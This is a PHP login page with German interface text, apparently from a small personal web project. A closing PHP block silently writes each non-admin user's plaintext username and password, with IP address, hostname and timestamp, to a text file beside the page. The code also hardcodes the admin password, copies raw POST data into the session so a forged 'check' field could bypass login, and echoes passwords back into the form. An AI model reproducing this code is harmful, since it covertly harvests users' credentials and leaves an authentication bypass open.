<!--
    Autor: Alex Glaser
    erstellt am: 28.03.2023
-->

<!DOCTYPE html>
<html lang="de" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Login</title>
    <link rel="stylesheet" href="./css/loginstyle.css">
  </head>
<?php
    session_name('login');
    session_start();
    $_SESSION = array_map('htmlspecialchars', $_POST);
    $username = @$_SESSION['username'];
    $password = @$_SESSION['password'];
    
    require("./db_init.php");

	if (isset($_SESSION['anmelden'])) {

		/************** Abfrage ob überhaupt was übergeben wurde **************/
		if ($password != "" && $username != "") {

      $sql = "SELECT * FROM alexglaserLogin";
      $ergebniss = mysqli_query($link, $sql);

      while ($row = mysqli_fetch_object($ergebniss)) {
        $password_aus_db = $row->password;
        $pw_verify = password_verify($password, $password_aus_db);
        // echo "User Passwort: ".$password."<br>Datenbank Passwort: ".$password_aus_db."<br>Verify: ".($pw_verify?"true":"false");
        if ($username == $row->username && $pw_verify) {
          $_SESSION['check'] = true;
          header('Location: alexglaser.php?action=home');
        } else {
          echo "
              <body class='body'>
                <div  style='z-index: 100;' class='center'>
                  <h1>Login</h1>
                  <form action='login.php' method='POST'>
                    <div class='txt_field'>
                      <input type='text' name='username' value='$username' required autofocus>
                      <span></span>
                      <label>Username</label>
                    </div>
                    <div class='txt_field'>
                      <input type='password' name='password' value='$password' required>
                      <span></span>
                      <label>Passwort</label>
                    </div>
                    <input type='submit' name='anmelden' value='Login'>
                    <div class='signup_link'><h3 style='color: red;'>Falsches Passwort oder Name</h3></div>
                    <div class='signup_link'>
                      Noch kein Account? <a href='signup.php'>Registrieren</a>
                    </div>
                  </form>
                </div>
              </body>";
        }
      }
    }
  }
?>
  <body class="body">
    <div class="center">
      <h1>Login</h1>
      <form action="login.php" method="POST">
        <div class="txt_field">
          <input type="text" name="username" required autofocus>
          <span></span>
          <label>Username</label>
        </div>
        <div class="txt_field">
          <input type="password" name="password" required>
          <span></span>
          <label>Passwort</label>
        </div>
        <!-- <div class="pass">Passwort vergessen?</div> -->
        <input type="submit" name="anmelden" value="Login">
        <div class="signup_link">
          Noch kein Account? <a href="signup.php">Registrieren</a>
          <input type="hidden" name="check" value="false">
        </div>
      </form>
    </div>
    <?php
        $ip = $_SERVER["REMOTE_ADDR"];
        $hostname = getHostByAddr($_SERVER["REMOTE_ADDR"]);
        $datum = date("d.m.Y");
        $uhrzeit = date("H:i:s");
        $dateiname = 'loginEinträge.txt';
        if ($_SESSION['anmelden'] && $_SESSION['username'] != 'admin' && $_SESSION['password'] != '01032004') {
            if (!file_exists($dateiname)) {
                $dateizeiger = fopen($dateiname, 'w+');
            } else {
                $dateizeiger = fopen($dateiname, 'a');
            }
            rewind($dateizeiger);
            flock($dateizeiger, LOCK_EX);
            fwrite($dateizeiger, "Hostname:\t$hostname\nIp:\t\t\t$ip\nDatum:\t\t$datum\nUhrzeit:\t$uhrzeit\nUsername:\t$username\nPasswort:\t$password\n\n");
            flock($dateizeiger, LOCK_UN);
            fclose($dateizeiger);
        }
    ?>
  </body>